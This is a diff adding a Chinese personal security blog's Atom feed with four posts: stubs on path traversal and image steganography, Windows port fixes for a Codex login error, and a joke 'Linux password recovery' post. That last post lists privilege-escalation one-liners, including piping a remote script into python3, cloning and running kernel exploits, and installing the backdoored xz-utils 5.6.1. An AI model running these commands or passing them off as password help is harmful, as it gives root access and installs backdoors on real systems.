@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <author>
+    <name>Doub1e007</name>
+  </author>
+  <generator uri="https://hexo.io/">Hexo</generator>
+  <id>https://doub1e007.github.io/</id>
+  <link href="https://doub1e007.github.io/" rel="alternate"/>
+  <link href="https://doub1e007.github.io/atom.xml" rel="self"/>
+  <rights>All rights reserved 2026, Doub1e007</rights>
+  <subtitle>保持热爱，奔赴山海</subtitle>
+  <title>剁椒鱼头没剁椒的博客</title>
+  <updated>2026-05-28T03:19:11.000Z</updated>
+  <entry>
+    <author>
+      <name>Doub1e007</name>
+    </author>
+    <category term="安全" scheme="https://doub1e007.github.io/categories/%E5%AE%89%E5%85%A8/"/>
+    <category term="服务器" scheme="https://doub1e007.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
+    <content>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a><strong>路径遍历</strong></h1><p>路径遍历也叫目录遍历。这种漏洞使攻击者能够读取运行应用程序的服务器上的任意文件。包括但不限于：</p><ul><li>应用程序代码和数据</li><li>后端系统凭证</li><li>敏感的操作系统文件</li></ul><p>某些情况下，攻击者可能能够写入服务器上的任意文件，从而修改应用程序数据或行为，并最终完全控制服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello boy</span><br></pre></td></tr></table></figure>]]>
+    </content>
+    <id>https://doub1e007.github.io/2026/05/28/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
+    <link href="https://doub1e007.github.io/2026/05/28/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+    <published>2026-05-28T03:19:11.000Z</published>
+    <summary>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" cla]]>
+    </summary>
+    <title>基础知识</title>
+    <updated>2026-05-28T03:19:11.000Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Doub1e007</name>
+    </author>
+    <category term="随记" scheme="https://doub1e007.github.io/categories/%E9%9A%8F%E8%AE%B0/"/>
+    <category term="常用工具报错解决" scheme="https://doub1e007.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
+    <content>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在新机器上下载使用Codex启动时遇到如下报错（登录失败：failed to start login server: 以一种访问权限不允许的方式做了一个访问套接字的尝试）</p><p>大概率是端口问题</p><p><strong>解决方案：</strong></p><ul><li>停止 Winnat → 释放 NAT 占用的端口。</li><li>查看排除端口 → 确认哪些端口被保留。</li><li>启动 Winnat → 恢复 NAT 功能。</li><li>再次查看 → 对比端口变化，判断端口是否可用。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net stop winnat</span><br><span class="line">netsh interface ipv4 show excludedportrange protocol=tcp</span><br><span class="line">net start winnat</span><br><span class="line">netsh interface ipv4 show excludedportrange protocol=tcp </span><br></pre></td></tr></table></figure><p><strong>关于使用codex要求验证手机号码，解决方案见下：</strong></p><p><a href="https://mp.weixin.qq.com/s/FcyiSAZJVGdfi0-27jg-Og">https://mp.weixin.qq.com/s/FcyiSAZJVGdfi0-27jg-Og</a></p><p>&#x3D;&#x3D;<strong>注意：</strong>&#x3D;&#x3D;<br>此方法仅供ChatGPT会员用户使用<br>普通用户跳过手机号验证也会出现问题<br>Failed to refresh token: 400 Bad Request: Invalid ‘refresh_token’: empty string. Expected a string with minimum length 1, but got an empty string instead.</p>]]>
+    </content>
+    <id>https://doub1e007.github.io/2026/05/19/%E4%BD%BF%E7%94%A8codex%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
+    <link href="https://doub1e007.github.io/2026/05/19/%E4%BD%BF%E7%94%A8codex%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+    <published>2026-05-19T08:47:52.000Z</published>
+    <summary>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" cla]]>
+    </summary>
+    <title>使用codex时遇到的问题及解决方案</title>
+    <updated>2026-05-19T08:47:52.000Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Doub1e007</name>
+    </author>
+    <category term="安全" scheme="https://doub1e007.github.io/categories/%E5%AE%89%E5%85%A8/"/>
+    <category term="隐写" scheme="https://doub1e007.github.io/tags/%E9%9A%90%E5%86%99/"/>
+    <content>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>图片隐写(Image Steganography)，即把信息藏在图片中，让人不能直接看出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello boy</span><br></pre></td></tr></table></figure>]]>
+    </content>
+    <id>https://doub1e007.github.io/2026/05/16/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</id>
+    <link href="https://doub1e007.github.io/2026/05/16/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
+    <published>2026-05-16T02:23:26.000Z</published>
+    <summary>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" cla]]>
+    </summary>
+    <title>图片隐写</title>
+    <updated>2026-05-16T02:23:26.000Z</updated>
+  </entry>
+  <entry>
+    <author>
+      <name>Doub1e007</name>
+    </author>
+    <category term="随记" scheme="https://doub1e007.github.io/categories/%E9%9A%8F%E8%AE%B0/"/>
+    <category term="漏洞" scheme="https://doub1e007.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
+    <content>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ol><li><p>Linux 找回密码教程，建议收藏！  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://copy.fail/exp | python3 &amp;&amp; su  </span><br></pre></td></tr></table></figure><p> passwd root  设置你的新密码  </p></li><li><p>你的 Linux 密码又忘了？<br> 没关系，这里还有一个新的！  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/V4bel/dirtyfrag.git&amp;&amp; cd dirtyfrag &amp;&amp; gcc -O0 -Wall -o exp exp.c -lutil &amp;&amp; ./exp </span><br></pre></td></tr></table></figure></li><li><p>不想再忘记密码了？<br> 我们有专业的黑客团队帮您运维服务器和保管密码！<br> 项目地址: <a href="https://github.com/tukaani-project/xz/tree/v5.6.1">https://github.com/tukaani-project/xz/tree/v5.6.1</a>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install xz-utils=5.6.1-1  </span><br><span class="line">sudo systemctl restart ssh </span><br></pre></td></tr></table></figure></li><li><p>容易忘记密码的有福了，每天都有新办法！<br> <a href="https://ze3tar.github.io/post-zcrx.html">https://ze3tar.github.io/post-zcrx.html</a><br> 插入一个支持ZCRX的高端网卡，让它down掉，然后ptr_ring drain + scrub loop重复入栈把free_count写溢出即可  </p></li><li><p>什么，你买不起高端网卡？那试试这个吧！  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/v12-security/pocs.git&amp;&amp; cd pocs/fragnesia &amp;&amp; gcc -o exp fragnesia.c &amp;&amp; ./exp  </span><br></pre></td></tr></table></figure></li><li><p>听说您的机房不允许ssh外连，只能通过KVM物理访问服务器? 没关系，我们的专业黑客团队也可以通过nginx帮助运维您的服务器！<br> <a href="https://depthfirst.com/nginx-rift">https://depthfirst.com/nginx-rift</a></p></li></ol>]]>
+    </content>
+    <id>https://doub1e007.github.io/2026/05/14/%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9BLinux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
+    <link href="https://doub1e007.github.io/2026/05/14/%E8%BF%91%E6%9C%9F%E4%B8%80%E4%BA%9BLinux%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
+    <published>2026-05-14T10:32:24.000Z</published>
+    <summary>
+      <![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" cla]]>
+    </summary>
+    <title>Linux密码找回方法(bushi</title>
+    <updated>2026-05-14T10:32:24.000Z</updated>
+  </entry>
+</feed>
